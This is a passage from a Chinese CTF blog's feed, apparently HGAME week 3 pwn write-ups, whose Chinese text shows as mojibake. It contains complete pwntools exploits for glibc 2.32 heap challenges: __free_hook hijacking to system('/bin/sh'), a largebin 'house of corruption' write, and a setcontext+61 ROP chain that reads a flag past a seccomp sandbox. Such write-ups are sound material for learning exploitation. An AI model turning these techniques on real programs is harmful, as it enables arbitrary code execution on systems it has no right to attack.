class="line">free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">key=u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;key=&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line">bd=free_hook^key</span><br><span class="line">edit(<span class="number">6</span>,p64(bd))</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">10</span>,p64(system))</span><br><span class="line"></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="large-note"><a href="#large-note" class="headerlink" title="large_note"></a>large_note</h3><p><code>uaf</code>é¢˜å‹ï¼Œæ¶‰åŠ<code>libc2.32</code>ä¸‹çš„<code>house of corruption</code>åˆ©ç”¨ï¼Œä¸»è¦é€‚ç”¨äºç”³è¯·<code>largebin</code>å¤§å°çš„<code>chunk</code>é¢˜å‹ï¼Œåˆ©ç”¨<code>house of corruption</code>å¯ä»¥æ”¹å¤§ä¸€ä¸ªå·²çŸ¥åœ°å€ã€‚</p><blockquote><p><a href="https://www.anquanke.com/post/id/244018#h2-0">å‚è€ƒåšå®¢</a></p></blockquote><p>è¯¥é¢˜ä¸­<code>add</code>å †å—çš„èŒƒå›´åœ¨<code>0x500 ~ 0x900</code>ä¹‹é—´ï¼Œé‡Šæ”¾çš„å †å—æ— æ³•è¿›å…¥<code>tcache</code>ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/222362/9/23351/7369/63d38f22F7c1ab05c/2d197bc7a6b55b13.png" style="zoom: 80%;" /><p>ç”¨äºåˆ©ç”¨å®ç°<code>house of corruption</code>çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ç”³è¯·ä¸€ä¸ª<code>0x520</code>å¤§å°çš„å †å—ï¼Œå†ç”³è¯·ä¸€ä¸ª<code>0x500</code>å¤§å°çš„å †å—é¿å…åˆå¹¶ï¼Œå†ç”³è¯·ä¸€ä¸ª<code>0x510</code>å¤§å°çš„å †å—ç”¨äºåç»­è§¦å‘ä¸Šè¿°ä»£ç ï¼ˆéœ€å°äºç¬¬ä¸€ä¸ªå †å—ï¼‰ã€‚</li><li>é‡Šæ”¾æ‰ç¬¬ä¸€ä¸ªå †å—å¹¶æ³„éœ²<code>libcåŸºå€</code>ï¼Œå…¶è¿›å…¥<code>unsortedbin</code>ï¼Œå¦‚æœä¸‹ä¸€ä¸ªç”³è¯·çš„å †å—å¤§äº<code>0x520</code>ï¼Œåˆ™ä½äº<code>unsortedbin</code>ä¸­çš„<code>free chunk</code>è¿›å…¥<code>largebin</code>ï¼Œå¦åˆ™è¢«åˆ‡å‰²åˆ©ç”¨ã€‚</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/83542/16/24081/51156/63d39605Fa2a878a1/04cb52e12f5ea5d5.png" style="zoom:80%;" /><ul><li>å› æ­¤ç”³è¯·ä¸€ä¸ª<code>0x600ï¼ˆå¿…é¡»å¤§äº0x520ï¼‰</code>çš„å †å—ï¼Œä½¿ä½äº<code>unsortedbin</code>ä¸­çš„<code>free chunk</code>è¿›å…¥<code>largebin</code>ã€‚</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/196137/37/31783/63481/63d39663Faa66a407/156f7bb626f4a20d.png" style="zoom:80%;" /><ul><li>ä¿®æ”¹<code>largebin chunk</code>çš„<code>bk-&gt;nextsize</code>ä¸ºç›®æ ‡åœ°å€<code>target-0x20</code>ï¼Œæ­¤å¤„æˆ‘ä»¬çš„<code>target</code>é€‰æ‹©<code>mp_+80</code>å³å­˜å‚¨<code>tcachebin</code>æ•°é‡çš„åœ°å€ï¼Œåˆè¯•ä¸º<code>64</code>ï¼Œæ¶µç›–<code>0x10 ~ 0x400</code>ï¼Œæˆ‘ä»¬è¦å°†å…¶æ”¹æˆä¸€ä¸ªå¤§å€¼ã€‚</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/33368/1/20074/24348/63d39780F379d4b90/d2d115d721e55e75.png" style="zoom:80%;" /><ul><li>é‡Šæ”¾ç¬¬ä¸‰ä¸ªå †å—ï¼Œå…¶è¿›å…¥<code>unsortedbin</code>ï¼Œæ•…æŠ€é‡æ–½å†ç”³è¯·ä¸€ä¸ª<code>0x600</code>çš„å †å—ï¼Œä½¿ä½äº<code>unsortedbin</code>ä¸­çš„<code>free chunk</code>è¿›å…¥<code>largebin</code>ï¼Œè§¦å‘<code>house of corruption</code>ã€‚</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/186253/30/31206/38843/63d396dfFbb6bb1d1/1eb4d20f0f8ca891.png" style="zoom:80%;" /><ul><li>æ­¤æ—¶å†é‡Šæ”¾çš„å †å—éƒ½ä¼šè¿›å…¥<code>tcachebin</code>ï¼Œåˆ©ç”¨<code>double free</code>å®Œæˆå¯¹<code>__free_hook</code>çš„åŠ«æŒå³å¯ã€‚</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/31868/14/20447/25602/63d3971eFbb7d2123/dbf9023f33eeddf0.png" style="zoom:80%;" /><ul><li><code>exp</code>å¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x12&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">lb=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span>-<span class="number">0x12</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&quot;lb=&quot;</span>+<span class="built_in">hex</span>(lb))</span><br><span class="line"></span><br><span class="line">bin_num=lb+<span class="number">1979008</span>+<span class="number">80</span></span><br><span class="line">free_hook=lb+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=lb+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x600</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(bin_num-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x600</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">key=u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">fk=free_hook^key</span><br><span class="line">log.success(<span class="string">&quot;key=&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(fk))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x600</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x600</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="note-context"><a href="#note-context" class="headerlink" title="note_context"></a>note_context</h3><p>ç›¸æ¯”äºä¸Šé¢˜å¼€äº†æ²™ç®±é»‘åå•ï¼Œç¦ç”¨äº†<code>execve</code>ã€‚<code>rdi</code>è½¬<code>rdx</code>å<code>setcontext+61</code>ä¸€æŠŠæ¢­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// rdi2rdx</span></span><br><span class="line">.text:<span class="number">000000000014B</span>760 <span class="number">48</span> <span class="number">8B</span> <span class="number">57</span> <span class="number">08</span>                   mov     rdx, [rdi+<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">000000000014B</span>764 <span class="number">48</span> <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>                   mov     [rsp+<span class="number">0</span>C8h+var_C8], rax</span><br><span class="line">.text:<span class="number">000000000014B</span>768 FF <span class="number">52</span> <span class="number">20</span>                      call    qword ptr [rdx+<span class="number">20</span>h]</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// setcontext+61</span></span><br><span class="line">.text:<span class="number">000000000005306</span>D <span class="number">48</span> <span class="number">8B</span> A2 A0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rsp, [rdx+<span class="number">0</span>A0h]</span><br><span class="line">.text:<span class="number">0000000000053074</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">9</span>A <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rbx, [rdx+<span class="number">80</span>h]</span><br><span class="line">.text:<span class="number">000000000005307B</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">6</span>A <span class="number">78</span>                   mov     rbp, [rdx+<span class="number">78</span>h]</span><br><span class="line">.text:<span class="number">000000000005307F</span> <span class="number">4</span>C <span class="number">8B</span> <span class="number">62</span> <span class="number">48</span>                   mov     r12, [rdx+<span class="number">48</span>h]</span><br><span class="line">.text:<span class="number">0000000000053083</span> <span class="number">4</span>C <span class="number">8B</span> <span class="number">6</span>A <span class="number">50</span>                   mov     r13, [rdx+<span class="number">50</span>h]</span><br><span class="line">.text:<span class="number">0000000000053087</span> <span class="number">4</span>C <span class="number">8B</span> <span class="number">72</span> <span class="number">58</span>                   mov     r14, [rdx+<span class="number">58</span>h]</span><br><span class="line">.text:<span class="number">000000000005308B</span> <span class="number">4</span>C <span class="number">8B</span> <span class="number">7</span>A <span class="number">60</span>                   mov     r15, [rdx+<span class="number">60</span>h]</span><br><span class="line">.text:<span class="number">000000000005308F</span> <span class="number">64</span> F7 <span class="number">04</span> <span class="number">25</span> <span class="number">48</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span>+test    dword ptr fs:<span class="number">48</span>h, <span class="number">2</span></span><br><span class="line">.text:<span class="number">000000000005308F</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">.text:<span class="number">000000000005309B</span> <span class="number">0F</span> <span class="number">84</span> B5 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>             jz      loc_53156</span><br><span class="line"></span><br><span class="line">.text:<span class="number">0000000000053156</span>                               loc_53156:                              ; CODE XREF: setcontext+<span class="number">6B</span>â†‘j</span><br><span class="line">.text:<span class="number">0000000000053156</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">8</span>A A8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rcx, [rdx+<span class="number">0</span>A8h]</span><br><span class="line">.text:<span class="number">000000000005315</span>D <span class="number">51</span>                            push    rcx</span><br><span class="line">.text:<span class="number">000000000005315</span>E <span class="number">48</span> <span class="number">8B</span> <span class="number">72</span> <span class="number">70</span>                   mov     rsi, [rdx+<span class="number">70</span>h]</span><br><span class="line">.text:<span class="number">0000000000053162</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">7</span>A <span class="number">68</span>                   mov     rdi, [rdx+<span class="number">68</span>h]</span><br><span class="line">.text:<span class="number">0000000000053166</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">8</span>A <span class="number">98</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rcx, [rdx+<span class="number">98</span>h]</span><br><span class="line">.text:<span class="number">000000000005316</span>D <span class="number">4</span>C <span class="number">8B</span> <span class="number">42</span> <span class="number">28</span>                   mov     r8, [rdx+<span class="number">28</span>h]</span><br><span class="line">.text:<span class="number">0000000000053171</span> <span class="number">4</span>C <span class="number">8B</span> <span class="number">4</span>A <span class="number">30</span>                   mov     r9, [rdx+<span class="number">30</span>h]</span><br><span class="line">.text:<span class="number">0000000000053175</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">92</span> <span class="number">88</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rdx, [rdx+<span class="number">88</span>h]</span><br><span class="line">.text:<span class="number">0000000000053175</span>                               ; &#125; <span class="comment">// starts at 53030</span></span><br><span class="line">.text:<span class="number">000000000005317</span>C                               ; __unwind &#123;</span><br><span class="line">.text:<span class="number">000000000005317</span>C <span class="number">31</span> C0                         xor     eax, eax</span><br><span class="line">.text:<span class="number">000000000005317</span>E C3                            retn</span><br></pre></td></tr></table></figure><ul><li>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè‹¥è°ƒç”¨<code>open</code>å‡½æ•°æŠ¥é”™ï¼Œå¯ä»¥å°è¯•<code>pop_rax_ret</code>+<code>syscall</code>è¿›è¡Œç³»ç»Ÿè°ƒç”¨ã€‚</li><li><code>exp</code>å¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-3.hgame.lwsec.cn&quot;</span>,<span class="number">30475</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x12&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">lb=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span>-<span class="number">0x12</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&quot;lb=&quot;</span>+<span class="built_in">hex</span>(lb))</span><br><span class="line"></span><br><span class="line">bin_num=lb+<span class="number">1979008</span>+<span class="number">80</span></span><br><span class="line">free_hook=lb+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x600</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(bin_num-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x600</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">key=u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">fk=free_hook^key</span><br><span class="line">log.success(<span class="string">&quot;key=&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(fk))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x600</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x600</span>)</span><br><span class="line"></span><br><span class="line">rdi2rdx=lb+<span class="number">0x000000000014b760</span></span><br><span class="line">setcontext=lb+<span class="number">0x5306D</span></span><br><span class="line">ret=lb+<span class="number">0x0000000000026699</span></span><br><span class="line">pop_rdi=lb+<span class="number">0x000000000002858f</span></span><br><span class="line">pop_rsi=lb+<span class="number">0x000000000002ac3f</span></span><br><span class="line">pop_rdx_r12=lb+<span class="number">0x0000000000114161</span></span><br><span class="line">pop_rax=lb+<span class="number">0x0000000000045580</span></span><br><span class="line">syscall=lb+<span class="number">0x00108D55</span></span><br><span class="line">read=lb+libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write=lb+libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line">heap=key*<span class="number">0x1000</span>+<span class="number">0x1f0</span></span><br><span class="line">edit(<span class="number">7</span>,p64(rdi2rdx))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0</span>)+p64(heap))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span>+p64(<span class="number">0</span>)+p64(setcontext)+p64(<span class="number">1</span>)*<span class="number">15</span>+p64(heap+<span class="number">0xc0</span>-<span class="number">0x10</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(heap+<span class="number">0x10</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">2</span>)+p64(syscall)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(heap+<span class="number">0x28</span>)+p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(read)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(write)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;b *&#123;&#125;&quot;.format(setcontext))</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="WEEK4"><a href="#WEEK4" class="headerlink" title="WEEK4"></a>WEEK4</h1><h2 id="pwn-3"><a href="#pwn-3" class="headerlink" title="pwn"></a>pwn</h2><h3 id="without-look"><a href="#without-look" class="headerlink" title="without_look"></a>without_look</h3><p><a href="https://www.cnblogs.com/LynneHuan/p/16387344.html">house of apple  by Lynne</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å¤å¥ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="wp" scheme="http://example.com/categories/ctf/wp/"/>
    
    
    <category term="house_of_botcake" scheme="http://example.com/tags/house-of-botcake/"/>
    
  </entry>
  
  <entry>
    <title>scanf_attackerï¼Ÿ</title>
    <link href="http://example.com/2022/09/02/scanf-hijacker/"/>
    <id>http://example.com/2022/09/02/scanf-hijacker/</id>
    <published>2022-09-02T01:55:51.000Z</published>
    <updated>2023-01-18T11:51:32.893Z</updated>
    
